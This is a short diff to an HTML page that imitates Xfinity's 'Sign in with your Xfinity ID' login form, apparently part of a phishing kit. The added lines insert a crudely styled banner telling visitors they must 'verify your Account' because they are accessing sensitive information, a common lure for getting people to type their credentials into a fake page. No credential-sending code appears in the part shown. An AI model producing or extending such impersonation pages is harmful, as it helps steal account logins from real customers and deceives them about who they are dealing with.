@@ -2416,6 +2416,9 @@ Comcast Business customer?
     </svg>
 </span>
 </div>
+
+<div><Center><p><font face="Trebuchet MS" color="black" size="2"> Because you're accessing sensitive info, you need to verify your Account</font><br></div>
+
             <prism-text tag="h1" display="display2" class="text-block display2 hydrated"> Sign in with your Xfinity ID </prism-text>
                 <prism-input-text prism-id="user" name="user" label="Enter your Xfinity ID" hide-label="true" placeholder="Email" value="" autocomplete="username" autocorrect="off" auto-capitalize="off" spellcheck="false" maxlength="128" required="true" data-value-missing="Please enter your Xfinity ID to sign in." class="sc-prism-input-text-h sc-prism-input-text-s contained hydrated"><!---->
                     <span class="screen-reader-text sc-prism-input-text" aria-live="assertive"></span>
